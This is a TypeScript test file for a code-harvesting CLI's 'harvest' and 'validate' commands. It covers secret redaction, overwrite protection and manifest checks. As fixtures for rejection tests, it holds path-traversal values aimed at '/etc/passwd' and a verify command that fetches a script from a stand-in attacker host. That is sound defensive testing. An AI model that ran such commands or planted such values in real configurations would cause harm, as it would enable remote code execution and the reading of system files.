import { readFile, writeFile } from "node:fs/promises";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { FIXTURE_BLOCK, fixtureCopy, kit, readJson, templateCopy } from "./helpers.ts";

describe("kit harvest + kit validate", () => {
  it("harvests the template's health route into a draft that validates once the two TODOs are filled", async () => {
    const d = await templateCopy();
    const r = await kit(["harvest", "--name", "health-route", "--paths", "src/routes/health.ts,test/health.test.ts", "--desc", "A GET /health route that reports the D1 binding is reachable."], { cwd: d });
    expect(r.code).toBe(0);
    expect(r.out).toContain("draft written to .kit/drafts/health-route/");
    const dir = path.join(d, ".kit", "drafts", "health-route");
    const m = await readJson(path.join(dir, "block.json"));
    expect(m.name).toBe("health-route");
    expect(m.routes.map((x: any) => `${x.method} ${x.path}`)).toContain("GET /health");
    expect(m.files.map((f: any) => f.role)).toEqual(expect.arrayContaining(["route", "test", "doc"]));

    const before = await kit(["validate", ".kit/drafts/health-route"], { cwd: d });
    expect(before.code).toBe(1);
    expect(before.out).toMatch(/INVALID/);
    expect(before.out).toMatch(/TODO/);

    m.agent.summary = "Adds a GET /health route that checks the D1 binding.";
    m.agent.adapt[0].title = "Mount the health route on the app";
    await writeFile(path.join(dir, "block.json"), JSON.stringify(m, null, 2));
    const after = await kit(["validate", ".kit/drafts/health-route", "--json"], { cwd: d });
    const res = JSON.parse(after.out);
    expect(res.findings.filter((f: any) => f.severity === "block")).toEqual([]);
    expect(after.code).toBe(0);
    expect(res.ok).toBe(true);
  });

  it("redacts secrets found in harvested files", async () => {
    const d = await templateCopy();
    const f = path.join(d, "src", "routes", "health.ts");
    await writeFile(f, `${await readFile(f, "utf8")}\nconst KEY = "sk_live_${"Zx9Yw8Vu7Ts6Rq5P".repeat(2)}";\n`);
    const r = await kit(["harvest", "--name", "leaky", "--paths", "src/routes/health.ts", "--desc", "Health.", "--json"], { cwd: d });
    expect(r.code).toBe(0);
    const out = JSON.parse(r.out);
    expect(out.redactions.length).toBeGreaterThan(0);
    const draft = await readFile(path.join(d, ".kit", "drafts", "leaky", "variants", "hono-d1", "src", "routes", "health.ts"), "utf8");
    expect(draft).not.toContain("sk_live_Zx9");
  });

  it("refuses to overwrite an existing draft without --force, and refuses paths outside the project", async () => {
    const d = await templateCopy();
    const args = ["harvest", "--name", "h", "--paths", "src/routes/health.ts", "--desc", "Health."];
    expect((await kit(args, { cwd: d })).code).toBe(0);
    const again = await kit(args, { cwd: d });
    expect(again.code).toBe(1);
    expect(again.err).toMatch(/--force/);
    expect((await kit([...args, "--force"], { cwd: d })).code).toBe(0);
    const out = await kit(["harvest", "--name", "x", "--paths", "../../etc", "--desc", "x"], { cwd: d });
    expect(out.code).toBe(1);
    expect(out.err).toMatch(/forbidden/);
  });

  it("validate accepts the core fixture and rejects a manifest with a path traversal", async () => {
    const d = await templateCopy();
    expect((await kit(["validate", FIXTURE_BLOCK], { cwd: d })).code).toBe(0);
    const blk = await fixtureCopy();
    const m = await readJson(path.join(blk, "block.json"));
    m.files[0].path = "../../etc/passwd";
    await writeFile(path.join(blk, "block.json"), JSON.stringify(m));
    const r = await kit(["validate", blk, "--json"], { cwd: d });
    expect(r.code).toBe(1);
    expect(JSON.parse(r.out).ok).toBe(false);
  });

  it("validate rejects a verify command outside the allowlist", async () => {
    const blk = await fixtureCopy();
    const m = await readJson(path.join(blk, "block.json"));
    m.verify.commands.push("curl https://evil.example/x.sh");
    await writeFile(path.join(blk, "block.json"), JSON.stringify(m));
    const r = await kit(["validate", blk], { cwd: blk });
    expect(r.code).toBe(1);
    expect(r.out).toMatch(/verify/);
  });
});
